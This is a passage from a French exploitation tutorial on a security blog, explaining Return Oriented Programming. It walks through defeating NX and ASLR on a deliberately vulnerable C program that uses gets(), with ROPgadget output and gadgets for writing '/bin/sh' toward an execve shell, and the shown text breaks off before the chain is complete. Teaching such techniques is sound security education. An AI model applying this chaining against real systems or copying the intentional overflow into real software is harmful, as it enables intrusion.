<!doctype html>
<html lang="fr-fr" class="no-js">

  <head>
    <link href="http://gmpg.org/xfn/11" rel="profile" hreflang="fr">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
  
    <meta name="google-site-verification" content="JeRPv2CEcpONAy8C7dMr1nzjlpZxlxYCtt2PnuQ78g8" />
    <!-- Enable responsiveness on mobile devices-->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  
    <title>
      
        ROP - Return Oriented Programming - hackndo
      
    </title>

	<link rel="stylesheet" href="/assets/css/style.css?v=1.13"> <!-- Resource style -->
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Signika:600"> <!-- Logo font -->
    <script src="/assets/js/modernizr.js"></script> <!-- Modernizr -->
    
    <link rel="apple-touch-icon" sizes="57x57" href="/assets/icones/favicon/apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="/assets/icones/favicon/apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="/assets/icones/favicon/apple-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="/assets/icones/favicon/apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="/assets/icones/favicon/apple-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="/assets/icones/favicon/apple-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="/assets/icones/favicon/apple-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="/assets/icones/favicon/apple-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/assets/icones/favicon/apple-icon-180x180.png">
    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icones/favicon/android-icon-192x192.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/assets/icones/favicon/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="/assets/icones/favicon/favicon-96x96.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/assets/icones/favicon/favicon-16x16.png">
    <link rel="manifest" href="/assets/res/manifest.json">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/assets/icones/favicon/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
  	
	<!-- RSS -->
    <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="hackndo" />

    <!-- Twitter card -->
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:site" content="@hackanddo" />
    <meta name="twitter:creator" content="@hackanddo" />
    <meta name="twitter:title" content="ROP - Return Oriented Programming" />
    <meta name="twitter:description" content="Cet article a pour but d'expliquer clairement ce qu'est le ROP ou Return Oriented Programming." />
    
    <meta name="twitter:image" content="http://localhost:4000/assets/uploads/2016/10/fourth_gadget.png" />
    
  
    <!-- Google analytics -->
    <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  
      ga('create', 'UA-80312745-1', 'auto');
      ga('send', 'pageview');
  
    </script>
    <!-- Begin Jekyll SEO tag v2.6.1 -->
<meta name="generator" content="Jekyll v4.0.0" />
<meta property="og:title" content="ROP - Return Oriented Programming" />
<meta name="author" content="Pixis" />
<meta property="og:locale" content="fr_FR" />
<meta name="description" content="Cet article a pour but d’expliquer clairement ce qu’est le ROP ou Return Oriented Programming." />
<meta property="og:description" content="Cet article a pour but d’expliquer clairement ce qu’est le ROP ou Return Oriented Programming." />
<link rel="canonical" href="http://localhost:4000/return-oriented-programming/" />
<meta property="og:url" content="http://localhost:4000/return-oriented-programming/" />
<meta property="og:site_name" content="hackndo" />
<meta property="og:image" content="http://localhost:4000/assets/uploads/2016/10/fourth_gadget.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2016-10-25T17:57:12+02:00" />
<script type="application/ld+json">
{"image":"http://localhost:4000/assets/uploads/2016/10/fourth_gadget.png","@type":"BlogPosting","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/icones/logo.png"},"name":"Pixis"},"url":"http://localhost:4000/return-oriented-programming/","headline":"ROP - Return Oriented Programming","dateModified":"2016-10-25T17:57:12+02:00","datePublished":"2016-10-25T17:57:12+02:00","author":{"@type":"Person","name":"Pixis"},"description":"Cet article a pour but d’expliquer clairement ce qu’est le ROP ou Return Oriented Programming.","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/return-oriented-programming/"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

</head>

  <body>
    <header class="cd-main-header">
    <a href="/" class="cd-logo"><img src="/assets/icones/logo.png" /> <span class="cd-logo-title">hackndo</span></a>
		
    <a href="#0" class="cd-nav-trigger">Menu<span></span></a>

</header> <!-- .cd-main-header -->
    <main class="cd-main-content">
		<nav class="cd-side-nav">
            <div class="sidebar-about">
    <h1>
        <img id="site-logo" src="/assets/icones/logo.png" alt="logo" title="logo" />
        <a class="sidebar-title" href="/">
        hackndo
        </a>
    </h1>
    <p class="lead">Think out of the box</p>
</div>

<ul>
    <li class="cd-label">Blog</li>
    <li class="">
        <a href="/">Home</a>
    </li>
    
    
        
            
        
    
        
            
                <li class="">
                    <a href="/about/">À propos</a>
                </li>
            
        
    
        
            
                <li class="">
                    <a href="/archives/">Archives</a>
                </li>
            
        
    
        
            
                <li class="">
                    <a href="/contact/">Me contacter</a>
                </li>
            
        
    
        
            
                <li class="">
                    <a href="/disclaimer/">Disclaimer</a>
                </li>
            
        
    
        
    
        
            
        
    
        
            
                <li class="">
                    <a href="/projects/">Projets</a>
                </li>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
        
    
        
    
</ul>
<ul>
    <li class="cd-label">Liens</li>
    <li><a href="https://www.dailysecurity.fr/" target="_blank">Blog de Geluchat</a></li>
    <li><a href="http://lsdsecdaemon.com" target="_blank">Blog de Th3_l5D</a></li>
    <li><a href="http://inf0sec.fr" target="_blank">Blog de Matthieu</a></li>
</ul>
<p class="sidebar-copyright">&copy; 2019. Tous droits réservés.</p>
<div class="sidebar-social">
<ul>
  <li><a href="https://twitter.com/HackAndDo" title="Twitter" target="_blank"><img alt="Twitter" title="Twitter" src="/assets/icones/social/twitter.png" /></a></li>
  <li><a href="https://github.com/hackndo" title="Github" target="_blank"><img title="Github" alt="Github" src="/assets/icones/social/github.png" /></a></li>
  <li><a href="https://www.youtube.com/channel/UC9WYWHLdu9TK-0Hu3wcHJ9g" title="Youtube" target="_blank"><img title="Youtube" alt="Youtube" src="/assets/icones/social/youtube.png" /></a></li>
  <li><a href="https://discord.gg/9At6SUZ" title="Discord" target="_blank"><img title="Discord" alt="Discord" src="/assets/icones/social/discord.png" /></a></li>
  <li><a href="https://www.linkedin.com/in/romainbentz/" title="LinkedIn" target="_blank"><img title="LinkedIn" alt="LinkedIn" src="/assets/icones/social/linkedin.png" /></a></li>
  <li><a href="https://sh.hackndo.com" title="Shell" target="_blank"><img title="Shell" alt="Shell" src="/assets/icones/social/shell.png" /></a></li>
  <li><a href="/feed.xml" title="RSS" target="_blank"><img title="RSS" alt="RSS" src="/assets/icones/social/rss.png" /></a></li>
  <li><a href="https://ko-fi.com/hackndo" title="Ko-Fi" target="_blank"><img title="Ko-Fi" alt="Ko-Fi" src="/assets/icones/social/kofi.gif" /></a></li>
</ul>
</div>
        </nav>

        <div class="content-wrapper">
            <div class="post">
  
  <div class="post-cover">
    <img src="/assets/uploads/2016/10/fourth_gadget.png" alt="ROP - Return Oriented Programming" title="ROP - Return Oriented Programming" />
  </div>
  
  <h1 class="post-title">ROP - Return Oriented Programming</h1>
  <div class="post-info">
      <p class="alignleft">25 Oct 2016 <a class="post-comments-count" href="http://http://localhost:4000/return-oriented-programming/#disqus_thread"></a></p>
      <p class="alignright">Auteur : <strong><a href="https://twitter.com/HackAndDo">Pixis</a></strong></p>
      <div class="keywords">
        <span class="post-tags"><a href="/archives/#user-land"><i class="fas fa-tags"></i> User Land</a><a href="/archives/#linux"><i class="fas fa-tags"></i> Linux</a></span>
      </div>
</div>

  <article>
  <p>Cet article a pour but d’expliquer clairement ce qu’est le ROP ou Return Oriented Programming. Qu’est-ce que cette technique ? Pourquoi est-elle utile ? Quelles sont les limites ? Comment la mettre en place ? Nous allons répondre ensemble à ces différentes questions.</p>

<!--more-->

<h2 id="rappels">Rappels</h2>

<p>Nous avons vu dans des précédants articles deux techniques d’exploitation suite à un buffer overflow. La première était une <a href="../buffer-overflow/">introduction et exploitation simple des buffer overflow (stack-based)</a> lorsque nous n’avions aucune protection. La pile était exécutable et la distribution aléatoire de l’adressage (ASLR - <em>Address Space Layout Randomization</em>) n’était pas activée. Nous reviendrons sur ces protections dans la suite.</p>

<p>Nous avons alors détaillé une technique pouvant être utilisée lorsque la pile n’était plus exécutable. Pour cela, vous pouvez lire l’article sur <a href="../retour-a-la-libc/">le retour à la libc</a>, mais celui-ci ne fonctionne plus lorsque l’ASLR est activé.</p>

<p>Cet article a alors pour but d’exposer une nouvelle technique d’exploitation, le ROP (<em>Return Oriented Programming</em>) qui permet malgré ces différentes protections de détourner de flux d’exécution d’un programme afin d’en prendre le contrôle.</p>

<h2 id="théorie">Théorie</h2>

<h3 id="aslr">ASLR</h3>

<p>Lorsque vous exécutez un programme, les entêtes du binaires sont supposés donner l’emplacement des différents segments/sections. Ainsi, à chaque fois qu’on lance le binaire, les adresses ne varient pas. La pile commence toujours au même endroit, même chose pour le tas, ainsi que les segments du binaire (Mais si ! Vous savez, on a tout expliqué dans l’article sur <a href="../gestion-de-la-memoire/">la gestion de la mémoire</a>).</p>

<p>Et bien l’ASLR est une protection dans le noyau qui va rendre certains espaces d’adressages aléatoires. Généralement, la pile, le tas et les bibliothèques sont impactées. Il n’est alors plus possible de retrouver à coup sûr l’adresse d’un shellcode placé sur la pile, ou l’adresse de la fonction <code class="highlighter-rouge">system</code> dans la libc. C’est bien ennuyant.</p>

<p>Mais ne vous inquiétez pas, ROP est là pour nous sauver.</p>

<h3 id="rop---return-oriented-programming">ROP - Return Oriented Programming</h3>

<p>Si vous aviez suivi l’article sur <a href="../retour-a-la-libc/">le retour à la libc</a>, alors sachez que c’était une sorte d’introduction au ROP.</p>

<p>Nous sommes toujours dans le même contexte. Un binaire est vulnérable au buffer overflow. Cependant ce binaire possède les deux protections que nous avons évoquées</p>

<ul>
  <li><strong>NX</strong> : C’est le nom répandu de la protection qui rend la pile <strong>N</strong>on e<strong>X</strong>écutable. Finis les shellcode sur la pile, que ce soit dans le buffer ou dans des variables d’environnement.</li>
  <li><strong>ASLR</strong> : En plus de ne plus être exécutable, la pile bouge d’une exécution à l’autre, tout comme le tas ou les librairies. Donc cette fois, nous ne pouvons plus trouver à coup sûr l’adresse de <code class="highlighter-rouge">system</code> comme nous l’avions fait dans l’article sur <a href="../retour-a-la-libc/">le retour à la libc</a>.</li>
</ul>

<p>Pour pallier à ces deux protections, il faut alors trouver une technique d’exploitation qui n’exécute rien sur la pile, et qui utilise des informations qui ne bougent pas d’une exécution à l’autre. Pour cela, nous allons utiliser du code qui a déjà été créé. Et quoi de plus simple qu’utiliser le code du binaire que nous voulons exploiter ?</p>

<h4 id="les-gadgets">Les gadgets</h4>

<p>Il est vrai qu’un binaire possède rarement le code permettant de lancer un shell. Ce serait trop beau. Cependant nous pouvons trouver à un endroit un bout de code qui permet de faire une action, puis à un autre endroit un autre bout de code qui permet de faire autre chose, et ainsi de suite. De cette façon, en enchaînant ces petits bouts d’instructions, on peut finalement réussir à faire des actions qui n’étaient pas prévues par le binaire.</p>

<p>Un exemple pas vraiment réaliste mais qui permet d’illustrer mes propos. Considérons la suite d’instruction présente, qui se trouve dans le binaire :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>1] PUSH    EBP
<span class="o">[</span>2] MOV     EBP, ESP
<span class="o">[</span>3] SUB     ESP, 0x40
<span class="o">[</span>4] XOR     EAX, EAX
<span class="o">[</span>5] PUSH    EAX
<span class="o">[</span>6] MOV     EAX, 0x41424344
<span class="o">[</span>7] PUSH    EAX
<span class="o">[</span>8] CALL    PRINTF
</code></pre></div></div>

<p>Le code précédant est un prologue de fonction, et place la chaine de caractère <code class="highlighter-rouge">ABCD\x00</code> sur la pile avant d’appeler la fonction <code class="highlighter-rouge">printf</code>. Remarquez que j’ai numéroté les lignes. Si maintenant nous prenons les instructions dans un nouvel ordre, par exemple [4] puis [5] suivi de [1] et enfin [8] alors nous aurions</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>4] XOR     EAX, EAX
<span class="o">[</span>5] PUSH    EAX
<span class="o">[</span>1] PUSH    EBP
<span class="o">[</span>8] CALL    PRINTF
</code></pre></div></div>

<p>Dans ce cas, nous aurions <code class="highlighter-rouge">0x00</code> sur la pile suivi de la valeur de <code class="highlighter-rouge">EBP</code> et enfin un appel à <code class="highlighter-rouge">printf</code>. Le résultat ne serait plus du tout le même. Pour peu que d’une certaine manière, nous contrôlions <code class="highlighter-rouge">EBP</code>, nous pourrions alors afficher ce que nous voulons, et pourquoi pas enchaîner sur une vulnérabilité de type chaîne de format.</p>

<p>Mais ce n’est pas tout, nous pouvons aller encore plus loin. Voilà la représentation en hexadécimal des instructions précédentes</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>55                  PUSH    EBP
89 e5               MOV     EBP, ESP
81 ec 40 00 00 00   SUB     ESP, 0x40
33 c0               XOR     EAX, EAX
50                  PUSH    EAX
b8 44 43 42 41      MOV     EAX, 0x41424344
50                  PUSH    EAX
e8 b1 69 00 00      CALL    PRINTF
</code></pre></div></div>

<p>Nous avons pensé à mélanger les instructions, mais il est également possible d’exécuter des morceaux d’instructions.</p>

<p>Je m’explique. Une analogie existe avec la langue française.</p>

<p>Dans le mot “République”, même si ce n’était pas mon intention, il y a aussi les mots “Pub”, “Pu”, “Publique” etc. Ce n’était pas le sens que je cherchais, mais rien n’empêche de ne choisir de lire que ces parties là.</p>

<p>Bref, vous avez compris le principe : Nous allons piquer des morceaux d’instructions à droite et à gauche, pas forcément des bouts d’instructions prévues par le programmeur, et en les mettant bout en bout, nous allons exécuter du code arbitraire.</p>

<p>Ces bouts d’instructions sont appelés des <strong>gadgets</strong>.</p>

<h4 id="utilisation-des-gadgets">Utilisation des gadgets</h4>

<p>Tout ça, c’est chouette, mais alors comment exécuter ces bouts d’instruction, ces gadgets ?</p>

<p>Dans un buffer overflow, lorsque nous écrasons suffisamment de données, nous finissons par écraser la sauvegarde de <code class="highlighter-rouge">EBP</code> (poussée sur la pile durant le prologue d’une fonction) puis la sauvegarde de <code class="highlighter-rouge">EIP</code> de la fonction appelante. Nous pouvons alors rediriger le programme là où nous le souhaitons, vers un gadget qui nous intéresse.</p>

<p>Cependant, une fois que ce morceau de code (gadget) est exécuté, nous souhaitons reprendre le contrôle du flux d’exécution pour sauter sur le deuxième gadget.</p>

<p>Cette contrainte fait que les gadget ont presque toujours la même forme :</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;instruction 1&gt;
&lt;instruction 2&gt;
...
&lt;instruction n&gt;
RET
</code></pre></div></div>

<p>Ainsi, lorsque les instructions que nous voulons effectuer ont été exécutées, l’instruction <code class="highlighter-rouge">RET</code> permet de sauter à l’instruction dont l’adresse est sur le dessus de la pile, pile que nous contrôlons grâce au buffer overflow.</p>

<p>Voici un exemple concret. Imaginons que dans l’ensemble des instructions de mon binaire, je trouve à différents endroits les instructions suivantes</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 0x08041234 Instructions 1</span>
INC   EAX
RET

<span class="c"># 0x08046666 Instructions 2</span>
XOR   EAX, EAX
RET

<span class="c"># 0x08041337 Instructions 3</span>
POP   EBX
RET

<span class="c"># 0x08044242 Instructions 4</span>
INT   0x80
</code></pre></div></div>

<p>Vous voyez que nous avons les adresses de ces 4 gadgets (suites d’instructions) <code class="highlighter-rouge">0x08041234</code>, <code class="highlighter-rouge">0x08046666</code>, <code class="highlighter-rouge">0x08041337</code> et <code class="highlighter-rouge">0x08044242</code>.</p>

<p>Pour que l’exemple reste simple, nous allons effectuer un appel système <code class="highlighter-rouge">sys_exit</code> avec comme argument la valeur <code class="highlighter-rouge">3</code> (Pour tous les appels systèmes vous pouvez jeter un oeil à mon github pour les architectures <a href="https://github.com/Hackndo/misc/blob/master/syscalls32.md" target="blank">32 bits</a> et les <a href="https://github.com/Hackndo/misc/blob/master/syscalls64.md" target="blank">64 bits</a>).</p>

<p>D’après le tableau 32 bits, pour faire un appel système à <code class="highlighter-rouge">sys_exit</code>, <code class="highlighter-rouge">EAX</code> doit prendre la valeur <strong>1</strong> et <code class="highlighter-rouge">EBX</code> la valeur du code de retour, ici <strong>3</strong> comme nous l’avons décidé.</p>

<p>Afin d’obtenir ces valeurs, en ayant les 4 différentes suites d’instructions précédentes, nous pouvons faire ceci :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>XOR    EAX, EAX		<span class="c"># Pour que EAX = 0</span>
INC    EAX		<span class="c"># Afin que EAX = 1</span>
POP    EBX		<span class="c"># En faisant en sorte que la valeur 0x00000003 soit sur la pile</span>
INT    0x80		<span class="c"># Permettant de faire l'appel système</span>
</code></pre></div></div>

<p>Ces différentes instructions mises bout à bout avec les bonnes valeurs sur la pile devraient appeler la fonction <code class="highlighter-rouge">exit(3)</code>.</p>

<p>Revenons à notre buffer overflow. Nous avons réécrit la valeur de la sauvegarde de <code class="highlighter-rouge">EIP</code> de la fonction appelante. Ainsi, lorsque notre fonction aura terminé de s’exécuter, nous serons redirigé vers la valeur que nous avons mis sur la sauvegarde de <code class="highlighter-rouge">EIP</code>.</p>

<p>Nous allons donc rediriger le flux d’exécution vers la première instruction que nous souhaitons exécuter, qui est le <code class="highlighter-rouge">XOR EAX, EAX</code>. La pile ressemblera alors à ceci</p>

<p><a href="/assets/uploads/2016/10/first_gadget.png"><img src="/assets/uploads/2016/10/first_gadget.png" alt="first_gadget" /></a></p>

<p>Le flux d’exécution va être redirigé vers les instructions</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 0x08041234 Instructions 1</span>
XOR    EAX, EAX
RET
</code></pre></div></div>

<p>Une fois le <code class="highlighter-rouge">XOR</code> effectué, c’est l’instruction <code class="highlighter-rouge">RET</code> qui va être exécutée. Pour rappel, un <code class="highlighter-rouge">RET</code> n’est rien d’autre qu’un <code class="highlighter-rouge">POP EIP</code>. L’adresse sur le dessus de la pile va donc être mis dans le registre <code class="highlighter-rouge">EIP</code>. Comme l’adresse sur le dessus de la pile est juste après le sEIP que nous avons écrasé (et qui a déjà été <code class="highlighter-rouge">POP</code> par le <code class="highlighter-rouge">RET</code> de la fonction), il suffit de mettre l’adresse du deuxième gadget sur le sommet de la pile, comme suit :</p>

<p><a href="/assets/uploads/2016/10/second_gadget.png"><img src="/assets/uploads/2016/10/second_gadget.png" alt="second_gadget" /></a></p>

<p>Suivi ensuite du gadget qui permet de faire le <code class="highlighter-rouge">POP EBX</code>. Cependant ce gadget a besoin d’une valeur spécifique sur la pile, puisque le gadget va “popper” une valeur pour la mettre dans <code class="highlighter-rouge">EBX</code>. Nous aurons alors la pile suivante</p>

<p><a href="/assets/uploads/2016/10/third_gadget.png"><img src="/assets/uploads/2016/10/third_gadget.png" alt="third_gadget" /></a></p>

<p>Le <code class="highlighter-rouge">POP EBX</code> va alors retirer la valeur <code class="highlighter-rouge">0x00000003</code> de la pile. Tous nos registres sont prêts, il ne reste plus qu’à rediriger le flux vers l’instruction <code class="highlighter-rouge">int 0x80</code> qui effectue l’appel système</p>

<p><a href="/assets/uploads/2016/10/fourth_gadget.png"><img src="/assets/uploads/2016/10/fourth_gadget.png" alt="fourth_gadget" /></a></p>

<p>En organisant la pile de cette manière, nous aurons nos gadgets qui vont s’enchaîner, remplir les registres tel que nous le shouaitons avant d’effectuer l’appel système qui nous intéresse.</p>

<p>Passons maintenant à un cas concret.</p>

<h2 id="pratique">Pratique</h2>

<p><em>Dans cet exemple, je prendrai les adresses que j’ai sur ma machine, elles ne correspondront sans doute pas aux votres. Adaptez donc votre exemple en fonction des résultats des différentes commandes sur votre machine !</em></p>

<p>Voici le programme vulnérable</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
</span>
<span class="cp"># Pour la compilation, il faut ajouter ces informations pour avoir les bonnes protections
# clang -o rop rop.c -m32 -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>

    <span class="n">gets</span><span class="p">(</span><span class="n">buff</span><span class="p">);</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">password</span> <span class="o">=</span> <span class="s">"I am h4cknd0"</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"You password is incorrect</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Access GRANTED !</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>J’utilise ici le compilateur <code class="highlighter-rouge">clang</code> car <code class="highlighter-rouge">gcc</code> <a href="http://reverseengineering.stackexchange.com/questions/13811/what-is-this-protection-that-seems-to-prevent-rop-when-aslr-in-on" target="blank">produit un prologue et un épilogue</a> qui rendent l’exploitation plus compliquée. Comme le but de cet article est de faire une démonstration simple et classique du ROP, nous utilisons clang qui produit un binaire “classique”.</p>

<p>Vous remarquez l’évident buffer overflow, si nous passons à ce binaire un gros buffer, il va normalement nous renvoyer une erreur de segmentation.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>perl <span class="nt">-e</span> <span class="s1">'print "A"x500'</span> | ./rop
You password is incorrect
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</code></pre></div></div>

<p>Comme le montre la commande suivante, la stack <code class="highlighter-rouge">GNU_STACK</code> n’a pas le flag <code class="highlighter-rouge">X</code> (seulement <code class="highlighter-rouge">RW</code>) donc elle n’est donc pas exécutable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>readelf <span class="nt">-l</span> rop

Elf file <span class="nb">type </span>is EXEC <span class="o">(</span>Executable file<span class="o">)</span>
Entry point 0x8048736
There are 6 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  LOAD           0x000000 0x08048000 0x08048000 0xa078d 0xa078d R E 0x1000
  LOAD           0x0a0f1c 0x080e9f1c 0x080e9f1c 0x01004 0x023c8 RW  0x1000
  NOTE           0x0000f4 0x080480f4 0x080480f4 0x00044 0x00044 R   0x4
  TLS            0x0a0f1c 0x080e9f1c 0x080e9f1c 0x00010 0x00028 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  GNU_RELRO      0x0a0f1c 0x080e9f1c 0x080e9f1c 0x000e4 0x000e4 R   0x1

</code></pre></div></div>

<p>Par ailleurs, l’ASLR est activé comme le montre le flag situé ici</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> /proc/sys/kernel/randomize_va_space
2
</code></pre></div></div>

<p>Si vous n’avez pas le même résultat, avec un autre nombre que le <code class="highlighter-rouge">2</code>, alors effectuez cette commande pour activer l’ASLR.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>2 | <span class="nb">sudo tee</span> /proc/sys/kernel/randomize_va_space
</code></pre></div></div>

<p>Vous pourrez toujours revenir à votre configuration d’origine en remettant le numéro que vous aviez initialement.</p>

<p>Nous allons essayer de lancer un shell avec ce programme, malgré les protections mises en place. Pour cela, nous allons avoir besoin de gadgets. Un outil extrêmement connu pour cette recherche s’appelle <a href="http://shell-storm.org/project/ROPgadget/" target="blank">ROPgadget</a>, je vous laisse l’installer. Il est très puissant et possède tout un tas d’options.</p>

<p>Une commande de base est</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ROPgadget <span class="nt">--binary</span> rop

</code></pre></div></div>

<p>Cette commande va nous sortir tous les gadgets qui finissent par un RET avec 10 instructions ou moins avant.</p>

<p>En voici un extrait</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>...]
0x0804c47e : xor eax, eax <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret
0x08050815 : xor eax, eax <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
0x0805489f : xor eax, eax <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> ret
0x0805821f : xor eax, eax <span class="p">;</span> pop ebx <span class="p">;</span> ret
<span class="o">[</span>...]
Unique gadgets found: 11840
</code></pre></div></div>

<p>Vous voyez qu’on a de quoi faire. 11840 résultats.</p>

<p>Si par exemple nous voulons trouver un <code class="highlighter-rouge">XOR EAX, EAX</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ROPgadget <span class="nt">--binary</span> rop | <span class="nb">grep</span> <span class="s2">"xor eax"</span>
<span class="o">[</span>...]
0x08049323 : xor eax, eax <span class="p">;</span> ret
</code></pre></div></div>

<p>Parfait. Nous avons notre premier gadget qui nous sera utile.</p>

<p>Je vous rappelle que nous voulons exécuter un shell. Il nous faut alors lancer <code class="highlighter-rouge">sys_execve("/bin/sh", NULL, NULL)</code>.</p>

<p>D’après la table des appels systèmes <a href="https://github.com/Hackndo/misc/blob/master/syscalls32.md" target="blank">32 bits</a>, la valeur de <code class="highlighter-rouge">EAX</code> pour un <code class="highlighter-rouge">execve</code> est de 11. Maintenant qu’on a un gadget qui initialise <code class="highlighter-rouge">EAX</code> à zéro, il faut par exemple l’incrémenter.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ROPgadget <span class="nt">--binary</span> rop | <span class="nb">grep</span> <span class="s2">"inc eax"</span>
<span class="o">[</span>...]
0x0804812c : inc eax <span class="p">;</span> ret
<span class="o">[</span>...]
</code></pre></div></div>

<p>Parfait, so far so good.</p>

<p>Il nous faut ensuite faire en sorte que <code class="highlighter-rouge">EBX</code> pointe sur la chaine de caractère “/bin/sh”, et que <code class="highlighter-rouge">ECX</code> et <code class="highlighter-rouge">EDX</code> soient des pointeurs nuls, car nous n’en avons pas besoin.</p>

<p>Pour pointer sur la chaine de caractère “/bin/sh”, il faut la placer en mémoire. Pour cela, il faut pouvoir écrire où nous le souhaitons. C’est une suite de gadget assez recherchée en général, et elle a un nom bien précis <strong>Write-what-where</strong>.</p>

<p>En voici un exemple avec les gadgets proposés par le binaire</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x0806ed1a : pop edx <span class="p">;</span> ret
0x080b8056 : pop eax <span class="p">;</span> ret
0x080546db : mov dword ptr <span class="o">[</span>edx], eax <span class="p">;</span> ret
</code></pre></div></div>

<p>Avec ces trois gadgets, nous contrôlons les contenus des registres <code class="highlighter-rouge">EDX</code> et <code class="highlighter-rouge">EAX</code>, puis nous pouvons déplacer le contenu de <code class="highlighter-rouge">EAX</code> à l’adresse pointée par <code class="highlighter-rouge">EDX</code>. Nous écrivons donc ce que nous voulons, là où nous le shouaitons. Parfait !</p>

<p>Nous sommes donc en mesure d’écrire “/bin/sh” quelque part en mémoire, par exemple dans .data qui ne bouge pas malgré l’ASLR.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>readelf <span class="nt">-S</span> rop | <span class="nb">grep</span> <span class="s2">" .data "</span>
  <span class="o">[</span>23] .data             PROGBITS        080ea000 0a1000 000f20 00  WA  0   0 32
</code></pre></div></div>

<p><code class="highlighter-rouge">.data</code> possède le flag <code class="highlighter-rouge">W</code> comme <strong>W</strong>ritable et se situe à l’adresse <code class="highlighter-rouge">0x080ea000</code>.</p>

<p>Enfin, nous devons trouver des gadgets pour contrôler nos registres <code class="highlighter-rouge">EBX</code> et <code class="highlighter-rouge">ECX</code> (car nous avons déjà trouvé un gadget pour <code class="highlighter-rouge">EDX</code> lors du <em>write-what-where</em>). Vous avez compris la technique, en voici deux :</p>

